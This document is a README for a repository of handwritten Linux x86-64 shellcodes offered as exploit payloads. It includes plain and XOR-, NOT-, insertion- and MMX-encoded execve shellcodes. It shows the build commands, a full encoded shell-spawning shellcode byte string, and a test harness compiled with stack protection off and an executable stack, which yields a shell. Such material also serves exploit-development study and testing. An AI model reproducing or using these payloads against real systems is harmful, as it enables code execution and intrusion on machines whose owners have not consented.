# SHELLCODE WORLD
Hello people, this is a collection of custom shellcodes build from scratch for intel x86-64 bit architecture. Right now the repository contains shellcode specific to only Linux x86-64 and are tried and tested on Ubuntu 18.04. These are made to be used as an exploit payload (i.e. shellcode without any bad character).

##  CONTENT


##  USAGE
All shellcodes are present in the [SHELLCODE_SAMPLES] directory. You can generate shellcode on your own. Just enter the make command as bellow -
```
critical@d3ad:~/ASSEMBLY_64-BIT_CODE/Shellcodes$ make
nasm -f elf64 exit.asm -o ./OBJECT_FILES/exit.o 
nasm -f elf64 message.asm -o ./OBJECT_FILES/message.o
nasm -f elf64 stack_method_message.asm -o ./OBJECT_FILES/stack_method_message.o
nasm -f elf64 message_rip_relative_addressing.asm -o ./OBJECT_FILES/message_rip_relative_addressing.o
nasm -f elf64 stack_method_execve.asm -o ./OBJECT_FILES/stack_method_execve.o
nasm -f elf64 jmp-call-pop_execve.asm -o ./OBJECT_FILES/jmp-call-pop_execve.o
nasm -f elf64 XOR_ENCODER_DECODER/xor_decoder_execve.asm -o ./OBJECT_FILES/xor_decoder_execve.o
nasm -f elf64 NOT_ENCODER_DECODER/not_decoder_execve.asm -o ./OBJECT_FILES/not_decoder_execve.o
nasm -f elf64 INSERTION_ENCODER_DECODER/insertion_decoder_execve.asm -o ./OBJECT_FILES/insertion_decoder_execve.o
nasm -f elf64 MMX-XOR-ENCODER-DECODER/mmx-xordecoder.asm -o ./OBJECT_FILES/mmx-xordecoder.o
```

## EXTRACT SHELLCODE
To extract the shellcode from an object file, use the `./Print_Shellcode` as done bellow -
```
critical@d3ad:~/ASSEMBLY_64-BIT_CODE/Shellcodes$ ./Print_Shellcode 
Enter the name of object file -> ./OBJECT_FILES/mmx-xordecoder.o

\xeb\x1e\x5e\x48\x8d\x7e\x08\x48\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x07\x48\x83\xc7\x08\xe2\xee\xeb\x0d\xe8\xdd\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xe2\x9b\x6a\xfa\xe2\x11\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xf9\xe2\x23\x4d\xfa\xe2\x23\x48\xfd\xe2\x23\x4c\x1a\x91\xa5\xaf

``` 
where `./OBJECT_FILES/mmx-xordecoder.o` is path to the object file.

## TESTING PAYLOAD
To generate the payload, put the shellcode into file [test_shellcode.c] into the array code[] and test the payload by issuing the bellow given commands-
```
critical@d3ad:~/ASSEMBLY_64-BIT_CODE/Shellcodes$ make payload
gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode

critical@d3ad:~/ASSEMBLY_64-BIT_CODE/Shellcodes$ make runpayload
./test_shellcode
Shellcode length : 92 
$ id
uid=1000(critical) gid=1000(critical) groups=1000(critical),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ 
$ 
$ 

```


Email me regarding any queries,<br>
**NAME** : **ABHINAV THAKUR**<br>
**EMAIL**: **compilepeace@gmail.com**


[SHELLCODE_SAMPLES]: ./SHELLCODE_SAMPLES
[test_shellcode.c]: ./test_shellcode.c